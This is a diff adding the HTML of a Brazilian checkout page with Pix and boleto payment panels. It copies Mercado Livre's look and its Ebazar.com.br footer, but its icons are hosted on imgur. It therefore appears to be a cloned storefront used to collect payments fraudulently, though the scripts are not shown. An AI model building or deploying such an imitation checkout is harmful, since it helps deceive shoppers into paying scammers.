+                                <span class='simboloDoValorDoFrete' style='display:none;font-family:proximaNovaLight;font-size:18px;font-weight:300;color:#333333;'>R$</span>
+                                &nbsp;
+                                <span class='corDoValorDoFrete' style='font-family:proximaNovaLight;font-size:18px;font-weight:300;color:#39b54a;'>
+                                    <span class='valorDoFrete'>Grátis</span>
+                                </span>
+                            </div>
+                        </div>
+                        <div style='margin:25px 0;width:100%;height:1px;background-color:rgba(51,51,51,.2);'></div>
+                        <div style='margin-top:10px;width:100%;display:flex;align-items:center;'>
+                            <span style='display:block;margin:0 auto 0 0;font-family:proximaNovaLight;font-size:18px;font-weight:300;color:#333333;'>Você pagará</span>
+                            <span style='display:block;margin:0 0 0 auto;font-family:proximaNovaLight;font-size:24px;font-weight:300;color:#333333;'>
+                                <span style='font-size:14px;text-decoration:line-through;'>
+                                    R$ <span class='valorTotalDoPedidoSemDesconto'></span>
+                                </span>
+                                <span class='valorTotalDoPedidoComDesconto'></span>
+                            </span>
+                        </div>
+                        <style>
+                            .botaoConfirmarPagamento {
+                                border-radius: 6px;
+                                height: 50px;
+                                background-color: #3483fa;
+                                display: flex;
+                            }
+
+                            .botaoConfirmarPagamento::before {
+                                content: "";
+                                width: 0%;
+                                background-color: rgba(255,255,255,.171);
+                            }
+                        </style>
+                        <div onclick='confirmarPagamento();' style='margin-top:25px;flex-grow:1;height:50px;position:relative;border-radius:6px;'>
+                            <div class="botaoConfirmarPagamento"></div>
+                            <span style='position:absolute;width:max-content;top:17px;left:calc(50% - 69.203px);font-family:proximaNovaRegular;font-size:16px;line-height:16px;font-weight:600;color:#ffffff;z-index:10;'>Confirmar a compra</span>
+                        </div>
+                    </div>
+                </div>
+                <div style='margin:0;width:100%;height:1px;background-color:rgba(51,51,51,.2);'></div>
+                <div style='flex-grow:1;padding:48px;text-align:center;background-color:#ffffff;'>
+                    <div style='width:100%;text-align:center;'>
+                        <div style='margin:0 auto;width:48px;height:48px;border-radius:50%;background-color:#f5f5f5;display:flex;align-items:center;'>
+                            <img src='https://i.imgur.com/QaMvYVh.png' style='margin:0 auto;max-height:24px;'>
+                        </div>
+                        <div style='margin-top:10px;width:100%;display:flex;align-items:center;'>
+                            <span id='logradouroEndereçoDeEntrega' style='margin:0 0 0 auto;font-family:proximaNovaLight;font-size:18px;font-weight:300;color:#333333;'></span>
+                            <span style='font-family:proximaNovaLight;font-size:14px;font-weight:300;color:#717171;'>&nbsp;</span>
+                            <span id='numeroEndereçoDeEntrega' style='margin:0 auto 0 0;font-family:proximaNovaLight;font-size:18px;font-weight:300;color:#333333;'></span>
+                        </div>
+                        <div style='margin-top:10px;width:100%;display:flex;align-items:center;'>
+                            <span id='cidadeEndereçoDeEntrega' style='margin:0 0 0 auto;font-family:proximaNovaLight;font-size:14px;font-weight:300;color:#717171;'></span>
+                            <span style='font-family:proximaNovaLight;font-size:14px;font-weight:300;color:#717171;'>,&nbsp;</span>
+                            <span id='estadoEndereçoDeEntrega' style='font-family:proximaNovaLight;font-size:14px;font-weight:300;color:#717171;'></span>
+                            <span style='font-family:proximaNovaLight;font-size:14px;font-weight:300;color:#717171;'>&nbsp;- CEP &nbsp;</span>
+                            <span id='cepEndereçoDeEntrega' style='margin:0 auto 0 0;font-family:proximaNovaLight;font-size:14px;font-weight:300;color:#717171;'></span>
+                        </div>
+                        <div style='margin-top:5px;width:100%;display:flex;align-items:center;'>
+                            <span id='nomeEndereçoDeEntrega' style='margin:0 0 0 auto;font-family:proximaNovaLight;font-size:14px;font-weight:300;color:#717171;'></span>
+                            <span style='font-family:proximaNovaLight;font-size:14px;font-weight:300;color:#717171;'>&nbsp;-&nbsp;</span>
+                            <span id='telefoneEndereçoDeEntrega' style='margin:0 auto 0 0;font-family:proximaNovaLight;font-size:14px;font-weight:300;color:#717171;'></span>
+                        </div>
+                        <div onclick='alterarEndereçoDeEntrega();' style='margin-top:7px;flex-grow:1;height:48px;display:flex;align-items:center;-webkit-tap-highlight-color:transparent;'>
+                            <span style='margin:0 auto;font-family:proximaNovaRegular;font-weight:400;font-size:18px;color:#3483fa;'>Alterar endereço de entrega</span>
+                        </div>
+                        <div style='margin:50px auto 0;width:48px;height:48px;border-radius:50%;background-color:#f5f5f5;display:flex;align-items:center;'>
+                            <img src='https://i.imgur.com/DFrkJDo.png' style='margin:0 auto;max-height:24px;'>
+                        </div>
+                        <span id='formaDeEntregaEscolhida' style='margin:10px auto 0;display:block;font-family:proximaNovaLight;font-size:18px;font-weight:300;color:#333333;'></span>
+                        <div onclick='alterarEndereçoDeEntrega();' style='margin-top:7px;flex-grow:1;height:48px;display:flex;align-items:center;-webkit-tap-highlight-color:transparent;'>
+                            <span style='margin:0 auto;font-family:proximaNovaRegular;font-weight:400;font-size:18px;color:#3483fa;'>Alterar a forma de entrega</span>
+                        </div>
+                    </div>
+                </div>
+                <div style='margin:0;width:100%;height:1px;background-color:rgba(51,51,51,.2);'></div>
+                <div style='flex-grow:1;padding:48px;text-align:center;background-color:#ffffff;'>
+                    <div style='margin:0 auto;width:48px;height:48px;border-radius:50%;background-color:#f5f5f5;display:flex;align-items:center;'>
+                        <img id='iconeFormaDePagamentoEscolhida' src='https://i.imgur.com/EMtLjBO.png' style='margin:0 auto;max-height:24px;'>
+                    </div>
+                    <span id='formaDePagamentoEscolhida' style='margin:10px auto 0;display:block;font-family:proximaNovaLight;font-size:18px;font-weight:300;color:#333333;'>Pix</span>
+                    <span style='margin:10px auto 0;display:block;font-family:proximaNovaLight;font-size:16px;font-weight:300;color:#333333;'>
+                        Você pagará R$ &nbsp;<span class='valorTotalDoPedidoComDesconto'></span>
+                    </span>
+                    <span style='margin:10px auto 0;display:block;font-family:proximaNovaLight;font-size:14px;font-weight:300;color:#717171;'>Nós não reservamos estoque até que o pagamento seja aprovado. Não perca tempo!</span>
+                    <div onclick='voltar2();' style='margin-top:7px;flex-grow:1;height:48px;display:flex;align-items:center;-webkit-tap-highlight-color:transparent;'>
+                        <span style='margin:0 auto;font-family:proximaNovaRegular;font-weight:400;font-size:18px;color:#3483fa;'>Alterar a forma de pagamento</span>
+                    </div>
+                </div>
+                <div style='margin:0;width:100%;height:1px;background-color:rgba(51,51,51,.2);'></div>
+                <div style='flex-grow:1;padding:48px;text-align:center;background-color:#ffffff;'>
+                    <div style='margin:0 auto;width:48px;height:48px;border-radius:50%;background-color:#f5f5f5;display:flex;align-items:center;'>
+                        <img id='iconeFormaDePagamentoEscolhida' src='https://i.imgur.com/eEdnZek.png' style='margin:0 auto;max-height:24px;'>
+                    </div>
+                    <span id='formaDePagamentoEscolhida' style='margin:10px auto 0;display:block;font-family:proximaNovaLight;font-size:18px;font-weight:300;color:#333333;'>Dados para a sua Nota Fiscal eletrônica</span>
+                    <span id='nomeParaNotaFiscalEletronica' style='font-family:proximaNovaLight;font-size:14px;font-weight:300;color:#717171;'></span>
+                    <span style='font-family:proximaNovaLight;font-size:14px;font-weight:300;color:#717171;'>&nbsp;- CPF &nbsp;</span>
+                    <span id='cpfParaNotaFiscalEletronica' style='margin:0 auto 0 0;font-family:proximaNovaLight;font-size:14px;font-weight:300;color:#717171;'></span>
+                    <div onclick='alterarDadosParaNotaFiscal();' style='margin-top:7px;flex-grow:1;height:48px;display:flex;align-items:center;-webkit-tap-highlight-color:transparent;'>
+                        <span style='margin:0 auto;font-family:proximaNovaRegular;font-weight:400;font-size:18px;color:#3483fa;'>Alterar</span>
+                    </div>
+                </div>
+                <div style='margin:0;width:100%;height:1px;background-color:rgba(51,51,51,.2);'></div>
+                <div style='flex-grow:1;padding:32px;text-align:center;background-color:#ffffff;'>
+                    <div onclick='confirmarPagamento();' style='flex-grow:1;height:50px;position:relative;border-radius:6px;'>
+                        <div class="botaoConfirmarPagamento"></div>
+                        <span style='position:absolute;width:max-content;top:17px;left:calc(50% - 69.203px);font-family:proximaNovaRegular;font-size:16px;line-height:16px;font-weight:600;color:#ffffff;z-index:10;'>Confirmar a compra</span>
+                    </div>
+                </div>
+            </div>
+            <div id='campoPedidoFinalizado' style='width:100%;display:none;flex-flow:column;'>
+                <div style='flex-grow:1;padding:32px;background-color:#00a650;'>
+                    <i onclick='voltar2();' class="material-icons" style='font-size:20px;color:#ffffff;opacity:.9;font-weight:bold;'>&#xe5cd;</i>
+                    <div style='margin-top:17px;flex-grow:1;display:flex;align-items:center;'>
+                        <span style='font-family:proximaNovaRegular;font-size:18px;font-weight:600;color:#ffffff;'>
+                            Pague <b>R$</b>
+                            <b class='valorTotalDoPedidoComDesconto'></b>
+                            via <span id='formaDePagamentoEscolhidaPedidoFinalizado'></span>
+                            para garantir sua compra
+                        </span>
+                    </div>
+                </div>
+                <div id='pedidoFinalizadoViaPix' style='margin:16px;padding:16px;flex-grow:1;background-color:#ffffff;border-radius:6px;box-shadow: 0 1px 2px 0 rgba(0,0,0,.1);display:none;flex-flow:column;'>
+                    <span style='display:block;font-family:proximaNovaRegular;font-size:16px;font-weight:600;color:#333333;'>Copie este código para pagar</span>
+                    <div style='margin-top:25px;width:100%;display:flex;'>
+                        <span style='display:block;font-family:proximaNovaRegular;font-size:16px;font-weight:600;color:#333333;'>1.&nbsp;</span>
+                        <span style='display:block;font-family:proximaNovaRegular;font-size:16px;font-weight:300;color:#333333;'>Acesse seu Internet Banking ou app de pagamentos.</span>
+                    </div>
+                    <div style='margin-top:10px;width:100%;display:flex;'>
+                        <span style='display:block;font-family:proximaNovaRegular;font-size:16px;font-weight:600;color:#333333;'>2.&nbsp;</span>
+                        <span style='display:block;font-family:proximaNovaRegular;font-size:16px;font-weight:300;color:#333333;'>Escolha pagar via Pix.</span>
+                    </div>
+                    <div style='margin-top:10px;width:100%;display:flex;'>
+                        <span style='display:block;font-family:proximaNovaRegular;font-size:16px;font-weight:600;color:#333333;'>3.&nbsp;</span>
+                        <span style='display:block;font-family:proximaNovaRegular;font-size:16px;font-weight:300;color:#333333;'>Cole o seguinte código:</span>
+                    </div>
+                    <div style='margin-top:25px;padding:5px 10px;flex-grow:1;border-radius:6px;border:solid 1px rgba(0,0,0,.1);display:flex;'>
+                        <div style='flex-grow:1;overflow:hidden;'>
+                            <input type='text' id='codigoPix' style='width:100%;height:40px;outline:0;border:none;background-color:rgba(0,0,0,0);font-family:proximaNovaRegular;font-size:14px;font-weight:600;color:rgba(0,0,0,.55);' disabled value=''>
+                        </div>
+                        <div style='margin-left:-10px;display:flex;padding:0 10px;height:40px;align-items:center;background: linear-gradient(90deg,hsla(0,0%,100%,0),#fff 30%,#fff);border-radius:0 6px 6px 0;'>
+                            <span onclick='copiarCodigo("codigoPix","Código copiado!");' style='margin:0 auto 0 10px;display:block;font-family:proximaNovaRegular;font-size:16px;font-weight:600;color:#3483fa;'>Copiar</span>
+                        </div>
+                    </div>
+                    <div style='margin-top:25px;width:100%;display:flex;align-items:center;'>
+                        <i class="material-icons" style='font-size:18px;color:rgba(0,0,0,.9);'>&#xe855;</i>
+                        <span style='margin:0 auto 0 10px;display:block;font-family:proximaNovaRegular;font-size:14px;color:rgba(0,0,0,.9);'>Pague e será creditado na hora</span>
+                    </div>
+                    <div onclick='copiarCodigo("codigoPix","Código copiado!");' style='margin-top:25px;flex-grow:1;height:48px;background-color:#3483fa;border-radius:6px;display:flex;align-items:center;-webkit-tap-highlight-color:transparent;'>
+                        <span style='margin:0 auto;font-family:proximaNovaRegular;font-weight:600;font-size:16px;color:#ffffff;'>Copiar código</span>
+                    </div>
+                    <div style='margin:25px 0;flex-grow:1;height:1px;background-color:rgba(0,0,0,.1);'></div>
+                    <span style='display:block;font-family:proximaNovaRegular;font-size:16px;font-weight:600;color:#333333;'>Você também pode pagar pelo QR Code Pix</span>
+                    <span style='margin-top:5px;display:block;font-family:proximaNovaRegular;font-size:14px;font-weight:400;color:rgba(0,0,0,.55);'>Escolha pagar via Pix pelo seu Internet Banking ou app de pagamentos. Depois, filme este código:</span>
+                    <img id='qrCodePix' style='margin:20px auto;width:148px;height:148px;' src=''>
+                </div>
+                <div id='pedidoFinalizadoViaBoleto' style='margin:16px;padding:16px;flex-grow:1;background-color:#ffffff;border-radius:6px;box-shadow: 0 1px 2px 0 rgba(0,0,0,.1);display:none;flex-flow:column;'>
+                    <span style='display:block;font-family:proximaNovaRegular;font-size:16px;font-weight:600;color:#333333;'>
+                        Você tem até <span id='vencimentoDoBoleto'>sexta-feira</span>
+                        para pagar
+                    </span>
+                    <span style='margin-top:10px;display:block;font-family:proximaNovaRegular;font-size:14px;font-weight:300;color:#717171;'>Para pagar pelo Internet Banking, copie a linha digitável ou escaneie o código de barras. Para pagar em qualquer banco, caixa eletrônico ou lotérica, por favor, imprima o boleto.</span>
+                    <div style='margin-top:25px;width:100%;display:flex;'>
+                        <i class="material-icons" style='font-size:18px;color:rgba(0,0,0,.9);'>&#xe855;</i>
+                        <span style='margin-left:10px;display:block;font-family:proximaNovaRegular;font-size:14px;color:rgba(0,0,0,.9);'>Se o pagamento é feito de segunda a sexta, é creditado no dia seguinte. Se você paga no fim de semana, será creditado na segunda-feira.</span>
+                    </div>
+                    <div style='width:100%;text-align:left;word-break:break-all;'>
+                        <span id='linhaDigitavel' style='margin-top:20px;display:block;font-family:proximaNovaRegular;font-size:14px;color:rgba(0,0,0,.9);'></span>
+                    </div>
+                    <span id='linkDoBoleto' style='display:none;'></span>
+                    <div onclick='copiarCodigo("linhaDigitavel","Linha digitável copiada!");' style='margin-top:25px;flex-grow:1;height:48px;background-color:#3483fa;border-radius:6px;display:flex;align-items:center;-webkit-tap-highlight-color:transparent;'>
+                        <span style='margin:0 auto;font-family:proximaNovaRegular;font-weight:600;font-size:16px;color:#ffffff;'>Copiar linha digitável</span>
+                    </div>
+                    <div onclick='imprimirBoleto();' style='margin-top:10px;flex-grow:1;height:48px;background-color:rgba(65,137,230,.15);border-radius:6px;display:flex;align-items:center;-webkit-tap-highlight-color:transparent;'>
+                        <span style='margin:0 auto;font-family:proximaNovaRegular;font-weight:600;font-size:16px;color:#3483fa;'>Imprimir boleto</span>
+                    </div>
+                </div>
+            </div>
+            <div id='progresso'></div>
+        </main>
+        <footer style='width:100%;border-top:solid 1px #ededed;display:none;align-items:center;'>
+            <div style='margin:25px;flex-grow:1;word-break:break-word;'>
+                <span style='display:block;font-family:proximaNovaRegular;font-size:12px;color:#333333;'>Termos e condições Como cuidamos da sua privacidade Acessibilidade Informações sobre seguros Blog Afiliados Tendências</span>
+                <span style='display:block;font-family:proximaNovaRegular;font-size:12px;color:#999999;opacity:.9;'>© 1999-2024 Ebazar.com.br LTDA.</span>
+                <span style='display:block;font-family:proximaNovaRegular;font-size:12px;color:#888888;'>CNPJ n.º 03.007.331/0001-41 Av. das Nações Unidas, nº 3.003, Bonfim, Osasco/SP - CEP 06233-903</span>
+            </div>
+        </footer>
+    </body>
+</html>
